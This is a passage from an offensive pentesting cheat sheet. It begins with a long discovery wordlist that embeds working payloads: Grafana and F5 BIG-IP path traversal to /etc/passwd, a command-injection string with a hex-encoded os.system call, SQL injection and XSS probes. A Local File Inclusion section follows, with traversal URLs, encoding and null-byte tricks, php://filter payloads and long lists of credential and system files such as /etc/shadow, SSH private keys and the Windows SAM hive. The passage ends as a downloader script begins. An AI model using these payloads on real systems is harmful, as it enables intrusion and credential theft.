/perl-status
/persistentchat/
/phoneconferencing/
/php
/php-fpm.conf
/php-info.php
/php-opcache-status/
/php.ini
/php.php
/php/adminer.php
/php/phpmyadmin/
/php_info.php
/phpinfo.php
/phpmyadmin/
/phppgadmin/intro.php
/phpstan.neon
/phpunit.xml
/phpversion.php
/pimcore/app/config/pimcore/google-api-private-key.json
/pinfo.php
/playground
/plesk-stat/
/plugin/build
/plugins/servlet/gadgets/makeRequest?url=https
/plugins/servlet/gadgets/makeRequest?url=https://google.com
/plugins/servlet/oauth/users/icon
/plugins/servlet/svnwebclient/changedResource.jsp?url=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
/plugins/servlet/svnwebclient/commitGraph.jsp?%27)%3Balert(%22XSS
/plugins/servlet/svnwebclient/commitGraph.jsp?url=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
/plugins/servlet/svnwebclient/error.jsp?errormessage=%27%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&description=test
/plugins/servlet/svnwebclient/statsItem.jsp?url=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)
/PMUser/
/pods
/pools/default/buckets
/portal
/portal-graphql
/portal/favicon.ico
/portal/images/MyVue/MyVueHelp.png
/powershell/
/pprof
/private
/private-key
/private.pem
/privatekey.key
/prod2local.sh
/production.log
/profile
/proftpd.conf
/properties.ini
/provider.tf
/Providers/HtmlEditorProviders/Telerik/Telerik.Web.UI.DialogHandler.aspx?dp=1
/proxy
/proxy.stream?origin=http
/PRTG/index.htm
/prtg/index.htm
/prweb/PRRestService/unauthenticatedAPI/v1/docs
/public/
/public/adminer.php
/public/config.js
/public/plugins/alertGroups/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/alertmanager/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/annolist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/barchart/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/bargauge/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/canvas/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/cloudwatch/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/dashboard/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/dashlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/debug/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/elasticsearch/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/gauge/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/geomap/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/gettingstarted/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/grafana/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/graph/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/graphite/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/heatmap/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/histogram/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/icon/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/influxdb/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/jaeger/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/live/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/logs/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/loki/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/mixed/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/mssql/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/mysql/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/news/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/nodeGraph/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/opentsdb/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/piechart/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/pluginlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/postgres/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/prometheus/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/stat/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/state-timeline/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/status-history/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/table-old/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/table/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/tempo/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/testdata/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/text/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/timeseries/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/welcome/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/xychart/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/zipkin/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/publicadminer.php
/pyproject.toml
/query
/query-api
/query-explorer
/query-laravel
/radio/application/configs/application.ini
/rails/actions?error=ActiveRecord
/railsapp/config/storage.yml
/reach/sip.svc
/read_file
/readfile
/README.md
/readme.txt
/redmine/config/configuration.yml
/redmine/config/environment.rb
/redmine/config/initializers/secret_token.rb
/redmine/config/secrets.yml
/redmine/config/settings.yml
/redoc
/reminder.sh
/remote/login
/Reports/Pages/Folder.aspx
/ReportServer
/ReportServer/Pages/ReportViewer.aspx
/requesthandler/
/requesthandlerext/
/rest/api/2/dashboard?maxResults=100
/rest/api/2/project?maxResults=100
/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true
/rest/api/latest/serverInfo
/rest/beta/repositories/go/group
/rest/tinymce/1/macro/preview
/rgs/
/rgsclients/
/robomongo.json
/robots.txt%2e%2e%3B/
/robots.txt..%3B/
/robots.txt../admin/
/robots.txt..;/
/robots.txt/%2e%2e%3B/
/robots.txt/..%3B/
/robots.txt/../admin/
/robots.txt/..;/
/roundcube/logs/errors.log
/roundcube/logs/sendmail
/routes/error_log
/rpc/
/rpcwithcert/
/ruby/config/storage.yml
/run
/run.sh
/runningpods/
/s/sfsites/aura
/s3cmd.ini
/s3proxy.conf
/sap/bc/gui/sap/its/webgui
/sap/hana/xs/formLogin/login.html
/sap/wdisp/admin/public/default.html
/sapi/debug/default/view
/scheduler/
/schema
/schema.rb
/script
/search/members/?id`%3D520)%2f**%2funion%2f**%2fselect%2f**%2f1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2Cunhex%28%2770726f6a656374646973636f766572792e696f%27%29%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2C30%2C31%2C32%23sqli=1
/search/token.json
/search?search_key={{1337*1338}}
/secret_token.rb
/secrets.yml
/secure/ConfigurePortalPages!default.jspa?view=popular
/secure/ContactAdministrators!default.jspa
/secure/Dashboard.jspa
/secure/ManageFilters.jspa?filter=popular&filterView=popular
/secure/ManageFilters.jspa?filterView=search&Search=Search&filterView=search&sortColumn=favcount&sortAscending=false
/secure/popups/UserPickerBrowser.jspa
/secure/QueryComponent!Default.jspa
/secure/ViewUserHover.jspa
/security.txt
/security.yml
/sell
/seminovos/application/configs/application.ini
/server
/server-status
/server.key
/server/storage/
/service-account-credentials.json
/service/rest/swagger.json
/service?Wsdl
/servicedesk/customer/user/login
/servicedesk/customer/user/signup
/services/Version
/servlet/Satellite?destpage=%22%3Ch1xxx%3Cscriptalert(1)%3C%2Fscript&pagename=OpenMarket%2FXcelerate%2FUIFramework%2FLoginError
/servlet/taskProc?taskId=shortURL&taskEnv=xml&taskContentType=xml&srcURL=https
/servlist.conf
/sessions/new
/settings.php.bak
/settings.php.dist
/settings.php.old
/settings.php.save
/settings.php.swp
/settings.php.txt
/settings.py
/settings.yml
/settings/settings.py
/setup.sh
/sfsites/aura
/sftp-config.json
/share/page/dologin
/shop/
/shop/application/configs/application.ini
/shutdown
/sidekiq
/site.sql
/site_cg/application/configs/application.ini
/sitecore/shell/sitecore.version.xml
/sitemanager.xml
/sites/all/libraries/mailchimp/vendor/phpunit/phpunit/phpunit
/slr/application/configs/application.ini
/smb.conf
/solr/
/sphinx
/sphinx-graphiql
/spring
/sql.sql
/ssl/localhost.key
/sslmgr
/startup.sh
/stat.jsp?cmd=chcp+437+%7c+dir
/static%2e%2e%3B/
/static..%3B/
/static../.git/config
/static../admin/
/static..;/
/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
/static/%2e%2e%3B/
/static/..%3B/
/static/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
/static/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
/static/..%5c..%5c..%5c..%5c..%5cetc/passwd
/static/..%5c..%5c..%5c..%5cetc/passwd
/static/..%5c..%5c..%5cetc/passwd
/static/..%5c..%5cetc/passwd
/static/..%5cetc/passwd
/static/../../../a/../../../../etc/passwd
/static/../admin/
/static/..;/
/static/api/swagger.json
/static/api/swagger.yaml
/static/emq.ico
/stats/summary
/status%3E%3Cscript%3Ealert(31337)%3C%2Fscript%3E
/status.php
/status/selfDiscovered/status
/storage.yml
/storage/
/storage/logs/laravel.log
/store/app/etc/local.xml
/subscriptions
/svnserve.conf
/swagger
/swagger-resources
/swagger-resources/restservices/v2/api-docs
/swagger-ui
/swagger-ui.html
/swagger-ui.js
/swagger-ui/swagger-ui.js
/swagger.json
/swagger.yaml
/swagger/api-docs
/swagger/index.html
/swagger/swagger
/swagger/swagger-ui.html
/swagger/swagger-ui.js
/swagger/ui/index
/swagger/ui/swagger-ui.js
/swagger/v1/api-docs
/swagger/v1/swagger.json
/swagger/v1/swagger.json/
/swagger/v1/swagger.yaml
/swagger/v2/api-docs
/swagger/v2/swagger.json
/swagger/v2/swagger.yaml
/sysmgmt/2015/bmc/info"  # Firmware Version and other info (iDRAC9
/system
/system-diagnostics
/systemstatus.xml
/Telerik.Web.UI.DialogHandler.aspx
/Telerik.Web.UI.DialogHandler.aspx?dp=1
/Telerik.Web.UI.DialogHandler.axd?dp=1
/Telerik.Web.UI.WebResource.axd?type=rau
/telescope/requests
/temp.php
/temp.sql
/test
/test.cgi
/test.php
/test/config/secrets.yml
/test/pathtraversal/master/..%252f..%252f..%252f..%252f../etc/passwd
/threaddump
/Thumbs.db
/tiki
/time.php
/tmui/login.jsp
/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license
/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/f5
/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'
/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin'
/tmui/tmui/login/welcome.jsp
/token.json
/tool/view/phpinfo.view.php
/tools/adminer.php
/toolsadminer.php
/trace
/Trace.axd
/translate.sql
/translations/en.json
/ucwa/
/ueditor/php/getRemoteImage.php
/ui/login.action
/ui/vault/auth
/unifiedmessaging/
/update.sh
/user
/user.ini
/user/0
/user/1
/user/2
/user/3
/user/login
/userportal/webpages/myaccount/login.jsp
/users.sql
/v0.1/
/v1
/v1.0/
/v1/
/v1/altair
/v1/api-docs
/v1/api/graphql
/v1/explorer
/v1/graph
/v1/graphiql
/v1/graphiql.css
/v1/graphiql.js
/v1/graphiql.min.css
/v1/graphiql.min.js
/v1/graphiql.php
/v1/graphiql/finland
/v1/graphql
/v1/graphql-explorer
/v1/graphql.php
/v1/graphql/console
/v1/graphql/schema.json
/v1/graphql/schema.xml
/v1/graphql/schema.yaml
/v1/playground
/v1/subscriptions
/v2
/v2/altair
/v2/api-docs
/v2/api/graphql
/v2/explorer
/v2/graph
/v2/graphiql
/v2/graphiql.css
/v2/graphiql.js
/v2/graphiql.min.css
/v2/graphiql.min.js
/v2/graphiql.php
/v2/graphiql/finland
/v2/graphql
/v2/graphql-explorer
/v2/graphql.php
/v2/graphql/console
/v2/graphql/schema.json
/v2/graphql/schema.xml
/v2/graphql/schema.yaml
/v2/keys/
/v2/playground
/v2/subscriptions
/v3
/v3/altair
/v3/api/graphql
/v3/explorer
/v3/graph
/v3/graphiql
/v3/graphiql.css
/v3/graphiql.js
/v3/graphiql.min.css
/v3/graphiql.min.js
/v3/graphiql.php
/v3/graphiql/finland
/v3/graphql
/v3/graphql-explorer
/v3/graphql.php
/v3/graphql/console
/v3/graphql/schema.json
/v3/graphql/schema.xml
/v3/graphql/schema.yaml
/v3/playground
/v3/subscriptions
/v4/altair
/v4/api/graphql
/v4/explorer
/v4/graph
/v4/graphiql
/v4/graphiql.css
/v4/graphiql.js
/v4/graphiql.min.css
/v4/graphiql.min.js
/v4/graphiql.php
/v4/graphiql/finland
/v4/graphql
/v4/graphql-explorer
/v4/graphql.php
/v4/graphql/console
/v4/graphql/schema.json
/v4/graphql/schema.xml
/v4/graphql/schema.yaml
/v4/playground
/v4/subscriptions
/Vagrantfile
/var/jwt/private.pem
/vendor/composer/installed.json
/vendor/phpunit/phpunit/phpunit
/vendor/webmozart/assert/.composer-auth.json
/verify.php?id=1&confirm_hash=
/version
/version.web
/views/ajax/autocomplete/user/a
/virtualems/Login.aspx
/VirtualEms/Login.aspx
/vpn/../vpns/cfg/smb.conf
/vpn/index.html
/wavemaker/studioService.download?method=getContent&inUrl=file///etc/passwd
/WEB-INF/web.xml
/web.config
/web/adminer.php
/web/debug/default/view
/web/home.html
/web/index.html
/web/manifest.json
/web/phpmyadmin/
/web/settings/settings.py
/web/static/c
/web_caps/webCapsConfig
/webadmin/out
/webadmin/start/
/webadmin/tools/systemstatus_remote.php
/webadmin/tools/unixlogin.php?login=admin&password=g%27%2C%27%27%29%3Bimport%20os%3Bos.system%28%276563686f2022626d39755a5868706333526c626e513d22207c20626173653634202d64203e202f7573722f6c6f63616c2f6e6574737765657065722f77656261646d696e2f6f7574%27.decode%28%27hex%27%29%29%23&timeout=5
/webadminer.php
/webalizer/
/webapi/v1/system/accountmanage/account
/webapp/?fccc0\><script>alert(1)</script>5f43d=1
/webclient/Login.xhtml
/webconsole/webpages/login.jsp
/webmail/
/webmail/?color=%22%3E%3Csvg/onload=alert(document.domain)%3E%22
/webmail/calendar/minimizer/index.php?style=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc%5cpasswd
/webmail/calendar/minimizer/index.php?style=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini
/webmin/
/webpack.config.js
/webpack.mix.js
/WebReport/ReportServer
/webstats/awstats.pl
/webticket/
/webticket/webticketservice.svc
/webticket/webticketservice.svcabs/
/wgetrc
/whoAmI/
/wiki
/wp
/ws2020/
/ws2021/
/ws_ftp.ini
/www.key
/www/delivery/afr.php?refresh=10000&\),10000000);alert(1337);setTimeout(alert(\
/xampp/phpmyadmin/
/xmldata?item=all
/xmldata?item=CpqKey
/XmlPeek.aspx?dt=\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\win.ini&x=/validate.ashx?requri
/xmlpserver/servlet/adfresource?format=aaaaaaaaaaaaaaa&documentId=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini
/xmlrpc.php
/xprober.php
/yarn.lock
/yii/vendor/phpunit/phpunit/phpunit
/zabbix.php?action=dashboard.view&dashboardid=1
/zend/vendor/phpunit/phpunit/phpunit
/zenphoto/zp
/zipkin/
/zm/?view=log
/zp
/zp/zp
```

## Local File Inclusion (LFI)

```c
$ http://<RHOST>/<FILE>.php?file=
$ http://<RHOST>/<FILE>.php?file=../../../../../../../../etc/passwd
$ http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd
```

### Until PHP 5.3

```c
$ http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd%00
```

### Root Cause Function

```c
get_file_contents
```

### Null Byte

```c
%00
0x00
```

#### Example

```c
http://<RHOST>/index.php?lang=/etc/passwd%00
```

### Encoded Traversal Strings

```c
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
..././
...\.\
```

### Chinese Dot Encoding

```c
%E3%80%82
```

#### Single Sign-On (SSO) Redirect

```c
https://<RHOST>/auth/sso/init/<username>@<--- CUT FOR BREVITY --->=https://google.com%E3%80%82<LHOST>/
```

### php://filter Wrapper

> https://medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb

> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion

> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter

```c
url=php://filter/convert.base64-encode/resource=file:////var/www/<RHOST>/api.php
```

```c
$ http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=index
$ http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
$ base64 -d <FILE>.php
```

### Read Process via Burp Suite

```c
GET /index.php?page=../../../../../../../proc/425/cmdline HTTP/1.1
```

### Read Process Allocations via Burp Suite

```c
GET /index.php?page=../../../../../../../proc/425/maps HTTP/1.1
```

### Parameters

```c
cat
dir
img
action
board
date
detail
file
files
download
path
folder
prefix
include
page
------------------------------------------------------------------inc
locate
show
doc
site
type
view
content
document
layout
mod
conf
```

### Django, Rails, or Node.js Web Application Header Values

```c
Accept: ../../../../.././../../../../etc/passwd{{
Accept: ../../../../.././../../../../etc/passwd{%0D
Accept: ../../../../.././../../../../etc/passwd{%0A
Accept: ../../../../.././../../../../etc/passwd{%00
Accept: ../../../../.././../../../../etc/passwd{%0D{{
Accept: ../../../../.././../../../../etc/passwd{%0A{{
Accept: ../../../../.././../../../../etc/passwd{%00{{
```

### Linux Files

```c
/etc/passwd
/etc/shadow
/etc/aliases
/etc/anacrontab
/etc/apache2/apache2.conf
/etc/apache2/httpd.conf
/etc/apache2/sites-available/000-default.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/at.allow
/etc/at.deny
/etc/bashrc
/etc/bootptab
/etc/chrootUsers
/etc/chttp.conf
/etc/cron.allow
/etc/cron.deny
/etc/crontab
/etc/cups/cupsd.conf
/etc/exports
/etc/fstab
/etc/ftpaccess
/etc/ftpchroot
/etc/ftphosts
/etc/groups
/etc/grub.conf
/etc/hosts
/etc/hosts.allow
/etc/hosts.deny
/etc/httpd/access.conf
/etc/httpd/conf/httpd.conf
/etc/httpd/httpd.conf
/etc/httpd/logs/access_log
/etc/httpd/logs/access.log
/etc/httpd/logs/error_log
/etc/httpd/logs/error.log
/etc/httpd/php.ini
/etc/httpd/srm.conf
/etc/inetd.conf
/etc/inittab
/etc/issue
/etc/knockd.conf
/etc/lighttpd.conf
/etc/lilo.conf
/etc/logrotate.d/ftp
/etc/logrotate.d/proftpd
/etc/logrotate.d/vsftpd.log
/etc/lsb-release
/etc/motd
/etc/modules.conf
/etc/motd
/etc/mtab
/etc/my.cnf
/etc/my.conf
/etc/mysql/my.cnf
/etc/network/interfaces
/etc/networks
/etc/npasswd
/etc/passwd
/etc/php4.4/fcgi/php.ini
/etc/php4/apache2/php.ini
/etc/php4/apache/php.ini
/etc/php4/cgi/php.ini
/etc/php4/apache2/php.ini
/etc/php5/apache2/php.ini
/etc/php5/apache/php.ini
/etc/php/apache2/php.ini
/etc/php/apache/php.ini
/etc/php/cgi/php.ini
/etc/php.ini
/etc/php/php4/php.ini
/etc/php/php.ini
/etc/printcap
/etc/profile
/etc/proftp.conf
/etc/proftpd/proftpd.conf
/etc/pure-ftpd.conf
/etc/pureftpd.passwd
/etc/pureftpd.pdb
/etc/pure-ftpd/pure-ftpd.conf
/etc/pure-ftpd/pure-ftpd.pdb
/etc/pure-ftpd/putreftpd.pdb
/etc/redhat-release
/etc/resolv.conf
/etc/samba/smb.conf
/etc/snmpd.conf
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/etc/ssh/ssh_host_dsa_key
/etc/ssh/ssh_host_dsa_key.pub
/etc/ssh/ssh_host_key
/etc/ssh/ssh_host_key.pub
/etc/sysconfig/network
/etc/syslog.conf
/etc/termcap
/etc/vhcs2/proftpd/proftpd.conf
/etc/vsftpd.chroot_list
/etc/vsftpd.conf
/etc/vsftpd/vsftpd.conf
/etc/wu-ftpd/ftpaccess
/etc/wu-ftpd/ftphosts
/etc/wu-ftpd/ftpusers
/logs/pure-ftpd.log
/logs/security_debug_log
/logs/security_log
/opt/lampp/etc/httpd.conf
/opt/xampp/etc/php.ini
/proc/cmdline
/proc/cpuinfo
/proc/filesystems
/proc/interrupts
/proc/ioports
/proc/meminfo
/proc/modules
/proc/mounts
/proc/net/arp
/proc/net/tcp
/proc/net/udp
/proc/<PID>/cmdline
/proc/<PID>/maps
/proc/sched_debug
/proc/self/cwd/app.py
/proc/self/environ
/proc/self/net/arp
/proc/stat
/proc/swaps
/proc/version
/root/anaconda-ks.cfg
/usr/etc/pure-ftpd.conf
/usr/lib/php.ini
/usr/lib/php/php.ini
/usr/local/apache/conf/modsec.conf
/usr/local/apache/conf/php.ini
/usr/local/apache/log
/usr/local/apache/logs
/usr/local/apache/logs/access_log
/usr/local/apache/logs/access.log
/usr/local/apache/audit_log
/usr/local/apache/error_log
/usr/local/apache/error.log
/usr/local/cpanel/logs
/usr/local/cpanel/logs/access_log
/usr/local/cpanel/logs/error_log
/usr/local/cpanel/logs/license_log
/usr/local/cpanel/logs/login_log
/usr/local/cpanel/logs/stats_log
/usr/local/etc/httpd/logs/access_log
/usr/local/etc/httpd/logs/error_log
/usr/local/etc/php.ini
/usr/local/etc/pure-ftpd.conf
/usr/local/etc/pureftpd.pdb
/usr/local/lib/php.ini
/usr/local/php4/httpd.conf
/usr/local/php4/httpd.conf.php
/usr/local/php4/lib/php.ini
/usr/local/php5/httpd.conf
/usr/local/php5/httpd.conf.php
/usr/local/php5/lib/php.ini
/usr/local/php/httpd.conf
/usr/local/php/httpd.conf.ini
/usr/local/php/lib/php.ini
/usr/local/pureftpd/etc/pure-ftpd.conf
/usr/local/pureftpd/etc/pureftpd.pdn
/usr/local/pureftpd/sbin/pure-config.pl
/usr/local/www/logs/httpd_log
/usr/local/Zend/etc/php.ini
/usr/sbin/pure-config.pl
/var/adm/log/xferlog
/var/apache2/config.inc
/var/apache/logs/access_log
/var/apache/logs/error_log
/var/cpanel/cpanel.config
/var/lib/mysql/my.cnf
/var/lib/mysql/mysql/user.MYD
/var/local/www/conf/php.ini
/var/log/apache2/access_log
/var/log/apache2/access.log
/var/log/apache2/error_log
/var/log/apache2/error.log
/var/log/apache/access_log
/var/log/apache/access.log
/var/log/apache/error_log
/var/log/apache/error.log
/var/log/apache-ssl/access.log
/var/log/apache-ssl/error.log
/var/log/auth.log
/var/log/boot
/var/htmp
/var/log/chttp.log
/var/log/cups/error.log
/var/log/daemon.log
/var/log/debug
/var/log/dmesg
/var/log/dpkg.log
/var/log/exim_mainlog
/var/log/exim/mainlog
/var/log/exim_paniclog
/var/log/exim.paniclog
/var/log/exim_rejectlog
/var/log/exim/rejectlog
/var/log/faillog
/var/log/ftplog
/var/log/ftp-proxy
/var/log/ftp-proxy/ftp-proxy.log
/var/log/httpd-access.log
/var/log/httpd/access_log
/var/log/httpd/access.log
/var/log/httpd/error_log
/var/log/httpd/error.log
/var/log/httpsd/ssl.access_log
/var/log/httpsd/ssl_log
/var/log/kern.log
/var/log/lastlog
/var/log/lighttpd/access.log
/var/log/lighttpd/error.log
/var/log/lighttpd/lighttpd.access.log
/var/log/lighttpd/lighttpd.error.log
/var/log/mail.info
/var/log/mail.log
/var/log/maillog
/var/log/mail.warn
/var/log/message
/var/log/messages
/var/log/mysqlderror.log
/var/log/mysql.log
/var/log/mysql/mysql-bin.log
/var/log/mysql/mysql.log
/var/log/mysql/mysql-slow.log
/var/log/proftpd
/var/log/pureftpd.log
/var/log/pure-ftpd/pure-ftpd.log
/var/log/secure
/var/log/vsftpd.log
/var/log/wtmp
/var/log/xferlog
/var/log/yum.log
/var/mysql.log
/var/run/utmp
/var/spool/cron/crontabs/root
/var/webmin/miniserv.log
/var/www/html<VHOST>/__init__.py
/var/www/html/db_connect.php
/var/www/html/utils.php
/var/www/log/access_log
/var/www/log/error_log
/var/www/logs/access_log
/var/www/logs/error_log
/var/www/logs/access.log
/var/www/logs/error.log
~/.atfp_history
~/.bash_history
~/.bash_logout
~/.bash_profile
~/.bashrc
~/.gtkrc
~/.login
~/.logout
~/.mysql_history
~/.nano_history
~/.php_history
~/.profile
~/.ssh/authorized_keys
~/.ssh/id_dsa
~/.ssh/id_dsa.pub
~/.ssh/id_rsa
~/.ssh/id_rsa.pub
~/.ssh/identity
~/.ssh/identity.pub
~/.viminfo
~/.wm_style
~/.Xdefaults
~/.xinitrc
~/.Xresources
~/.xsession
```

### Windows Files

```c
C:/Users/Administrator/NTUser.dat
C:/Documents and Settings/Administrator/NTUser.dat
C:/apache/logs/access.log
C:/apache/logs/error.log
C:/apache/php/php.ini
C:/boot.ini
C:/inetpub/wwwroot/global.asa
C:/MySQL/data/hostname.err
C:/MySQL/data/mysql.err
C:/MySQL/data/mysql.log
C:/MySQL/my.cnf
C:/MySQL/my.ini
C:/php4/php.ini
C:/php5/php.ini
C:/php/php.ini
C:/Program Files/Apache Group/Apache2/conf/httpd.conf
C:/Program Files/Apache Group/Apache/conf/httpd.conf
C:/Program Files/Apache Group/Apache/logs/access.log
C:/Program Files/Apache Group/Apache/logs/error.log
C:/Program Files/FileZilla Server/FileZilla Server.xml
C:/Program Files/MySQL/data/hostname.err
C:/Program Files/MySQL/data/mysql-bin.log
C:/Program Files/MySQL/data/mysql.err
C:/Program Files/MySQL/data/mysql.log
C:/Program Files/MySQL/my.ini
C:/Program Files/MySQL/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log
C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/my.ini
C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/access.log
C:/Program Files (x86)/Apache Group/Apache/conf/error.log
C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml
C:/Program Files (x86)/xampp/apache/conf/httpd.conf
C:/WINDOWS/php.ini
C:/WINDOWS/Repair/SAM
C:/Windows/repair/system
C:/Windows/repair/software
C:/Windows/repair/security
C:/WINDOWS/System32/drivers/etc/hosts
C:/Windows/win.ini
C:/WINNT/php.ini
C:/WINNT/win.ini
C:/xampp/apache/bin/php.ini
C:/xampp/apache/logs/access.log
C:/xampp/apache/logs/error.log
C:/Windows/Panther/Unattend/Unattended.xml
C:/Windows/Panther/Unattended.xml
C:/Windows/debug/NetSetup.log
C:/Windows/system32/config/AppEvent.Evt
C:/Windows/system32/config/SecEvent.Evt
C:/Windows/system32/config/default.sav
C:/Windows/system32/config/security.sav
C:/Windows/system32/config/software.sav
C:/Windows/system32/config/system.sav
C:/Windows/system32/config/regback/default
C:/Windows/system32/config/regback/sam
C:/Windows/system32/config/regback/security
C:/Windows/system32/config/regback/system
C:/Windows/system32/config/regback/software
C:/Program Files/MySQL/MySQL Server 5.1/my.ini
C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml
C:/Windows/System32/inetsrv/config/applicationHost.config
C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
```

### LFI File Downloader

#### lfidownloader.py

```c
import requests
from  pathlib import Path
import base64

# Files to Download:
# /proc/sched_debug
# /proc/<<PID>>/maps
# /usr/lib/x86_64-linux-gnu/libc-2.31.so
